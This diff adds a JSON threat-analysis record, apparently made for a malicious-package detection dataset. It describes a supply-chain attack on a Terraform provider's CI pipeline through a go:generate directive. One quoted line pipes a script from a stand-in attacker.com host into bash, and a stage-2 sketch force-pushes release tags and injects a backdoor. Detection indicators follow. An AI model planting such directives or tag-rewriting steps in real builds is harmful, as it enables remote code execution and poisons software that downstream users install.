@@ -1,0 +1,111 @@
+{
+  "package_info": {
+    "package_name": "chainguard-cosign-terraform-provider",
+    "package_manager": "Terraform Registry (custom provider, GitHub source)",
+    "package_versions": "0.0.17 (and any unpinned versions)",
+    "why_malicious": "The package is considered malicious in this context because it can be compromised via a supply chain attack: a malicious contributor can submit a pull request containing a go:generate directive that executes arbitrary code during the build pipeline, leading to remote code execution, repository tampering, and potential compromise of downstream Docker images. The lack of a .terraform.lock.hcl file and unsafe GitHub Actions workflow configuration (pull_request_target with write permissions) further enable this attack."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "ci-cd (build pipeline, go generate phase)",
+        "file_location": "*.go (source code files with //go:generate directives)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "//go:generate curl -fsSL https://attacker.com/stage2.sh | bash",
+      "code_language": "go (directive triggers shell command)",
+      "code_behavior": "During the build pipeline, the go generate command executes a shell command embedded in a comment, which downloads and executes a remote Bash script, enabling arbitrary code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Embedding a remote code execution command in a go:generate directive is highly suspicious, as it allows untrusted code to run during the build process.",
+        "violated_expectations": "Normally, go:generate is used for code generation tasks, not for downloading and executing remote scripts. The expectation is that only trusted, deterministic commands are used.",
+        "similar_legitimate_use": "go:generate is legitimately used for code generation (e.g., stringer, mockgen), but not for arbitrary remote script execution.",
+        "key_indicators": [
+          "go:generate directive with network access (curl/wget)",
+          "Piping remote script directly to shell",
+          "Non-deterministic, non-local code execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "ci-cd (post-go generate, as part of attacker’s stage 2 script)",
+        "file_location": "stage2.sh (downloaded and executed by go:generate)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "git (repo write access)"
+        ]
+      },
+      "code_snippet": "git checkout -b attacker-branch\n# Insert backdoor code\n# Poison release artifacts\ngit tag -f 0.0.17\n# Force push tag and branch",
+      "code_language": "shell",
+      "code_behavior": "After go generate, the downloaded Bash script creates a new branch, injects a backdoor, force-pushes a release tag to point to the malicious commit, and poisons release artifacts, enabling supply chain compromise.",
+      "malice_analysis": {
+        "why_suspicious": "Automated manipulation of repository tags and branches, especially force-pushing release tags, is a classic supply chain attack technique.",
+        "violated_expectations": "Normal build scripts do not rewrite release tags or inject backdoors into the codebase.",
+        "similar_legitimate_use": "Release automation may update tags, but not in response to untrusted PRs or via remote scripts.",
+        "key_indicators": [
+          "Force-pushing tags/branches in CI",
+          "Automated backdoor injection",
+          "Release artifact tampering"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a pull request from a fork containing a malicious //go:generate directive.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious code is executed during CI build."
+    },
+    {
+      "step": 2,
+      "action": "During CI, go generate executes the directive, downloading and running the attacker's Bash script.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Stage 2 script is executed with CI permissions."
+    },
+    {
+      "step": 3,
+      "action": "Stage 2 script manipulates the repository: creates a branch, injects a backdoor, force-pushes the release tag, and poisons release artifacts.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Malicious provider is published; downstream consumers are compromised."
+    },
+    {
+      "step": 4,
+      "action": "If not mitigated, the poisoned provider could be used in downstream workflows, potentially compromising Docker images or other critical infrastructure.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Final goal: supply chain compromise of Chainguard Docker images."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "go:generate directives invoking network utilities (curl, wget) or shell interpreters",
+      "CI/CD pipeline execution of go generate on untrusted code",
+      "Automated force-push of release tags or branches during CI",
+      "Execution of remote scripts during build"
+    ],
+    "file_indicators": [
+      "*.go files with suspicious //go:generate lines (containing curl, wget, bash, sh)",
+      "Presence of stage2.sh or similar scripts downloaded at build time",
+      "Absence of .terraform.lock.hcl (unlocked provider versions)"
+    ],
+    "network_indicators": [
+      "CI/CD build machines making outbound requests to untrusted or non-canonical domains (e.g., attacker.com)",
+      "Unexpected downloads during go generate phase"
+    ],
+    "how_to_detect": "Monitor build pipelines for go:generate directives that invoke network utilities or shell interpreters. Flag any go:generate lines that download and execute remote scripts. Detect force-pushes of tags or branches from CI jobs, especially in response to pull_request_target events. Alert on absence of .terraform.lock.hcl in Terraform provider builds. Monitor for outbound network connections from build jobs to non-standard domains during code generation or build steps."
+  }
+}
